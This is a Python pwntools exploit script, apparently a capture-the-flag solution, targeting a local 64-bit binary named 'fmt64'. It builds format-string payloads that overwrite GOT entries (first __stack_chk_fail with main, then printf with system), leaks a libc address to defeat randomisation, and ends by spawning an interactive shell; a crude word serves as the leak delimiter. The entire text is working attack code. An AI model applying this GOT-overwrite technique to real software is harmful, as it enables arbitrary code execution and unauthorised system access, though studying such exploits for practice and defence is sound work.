#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from brucepwn import *

elf = ELF("./fmt64")
libc = elf.libc
r = elf.process()
main = 0x4006d6

# construct format string payload
fmt = FmtStr()
fmt.write(main&0xffff, 17, 2) # write main&0xffff to memory address at index ( stack position ) 17, 2 bytes
fmt.write(main>>16, 18, 1)
fmt.raw("dildo%23$pdildo") # for leaking libc_start_main_ret
fmt.pad(72) # padding
fmt.raw( p64(elf.got.__stack_chk_fail) + p64(elf.got.__stack_chk_fail + 2) )
fmt.pad(0x69)

r.sendline(str(fmt))
r.recvuntil("dildo")
addr = r.recvuntil("dildo")[:-5:]
libc.address = int(addr, 16) - 0x20830
system = libc.symbols.system
log.success("libc: {:#x}".format(libc.address))
log.success("printf: {:#x}".format(libc.symbols.printf))
log.success("system: {:#x}".format(system))

fmt.new()
fmt.write(system&0xff, 17, 1)
fmt.write((system>>8)&0xffff, 18, 2)
fmt.pad(72)
fmt.raw( p64(elf.got.printf) + p64(elf.got.printf + 1) )
fmt.pad(0x69)

r.sendline(str(fmt))
r.sendline("sh;")
r.interactive()
